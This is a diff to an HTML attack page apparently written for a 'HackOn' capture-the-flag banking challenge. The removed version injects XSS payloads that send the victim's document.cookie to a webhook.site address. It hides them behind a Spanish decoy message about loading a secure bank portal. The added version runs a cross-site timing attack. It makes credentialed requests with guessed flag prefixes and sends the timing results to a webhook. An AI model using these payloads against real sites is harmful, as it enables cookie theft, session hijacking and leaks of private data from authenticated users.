@@ -1,21 +1,32 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading...</title>
-</head>
-<body>
-    <script>
-        setTimeout(() => {
-            const payload = '"></iframe><script>fetch("https://webhook.site/09a9173a-5515-4eb1-80d0-d8ae12474c20?c="+document.cookie)//';
-            window.location = "https://hackon-seeknbank-web.chals.io/?q=" + encodeURIComponent(payload);
-            
-            setTimeout(() => {
-                window.location = "http://web-vulnerable:5000/?q=" + 
-                    encodeURIComponent('<img src=x onerror="fetch(\'https://webhook.site/09a9173a-5515-4eb1-80d0-d8ae12474c20?c=\'+document.cookie)">');
-            }, 3000);
-        }, 2000);
-    </script>
-    <h1>Cargando portal bancario...</h1>
-    <p>Por favor espere, redirigiendo al sistema seguro...</p>
-</body>
-</html>
+<!doctype html>
+<html><body>
+<script>
+const p = new URLSearchParams(location.search);
+const webhook = p.get('w');
+const q1 = p.get('q1') || 'HackOn{';
+const q2 = p.get('q2') || 'zzzzzzz';
+const m = parseInt(p.get('m') || '25', 10);
+const target = 'https://hackon-seeknbank-web.chals.io/';
+
+function emit(obj){ if(!webhook) return; obj.t=Date.now(); (new Image()).src = webhook + '?' + new URLSearchParams(obj).toString(); }
+
+async function batch(label,q){
+  const t0=performance.now();
+  for(let i=0;i<m;i++){
+    await fetch(target+'?q='+encodeURIComponent(q)+'&r='+Math.random(), {mode:'no-cors', credentials:'include', cache:'no-store'});
+  }
+  const dur=performance.now()-t0;
+  emit({event:'batch',label,q,m,dur:dur.toFixed(2)});
+  return dur;
+}
+
+(async()=>{
+  emit({event:'start',ua:navigator.userAgent,q1,q2,m});
+  await new Promise(r=>setTimeout(r,300));
+  const a=await batch('q1',q1);
+  const b=await batch('q2',q2);
+  emit({event:'done',diff:(a-b).toFixed(2),a:a.toFixed(2),b:b.toFixed(2)});
+})();
+</script>
+fetchbench
+</body></html>
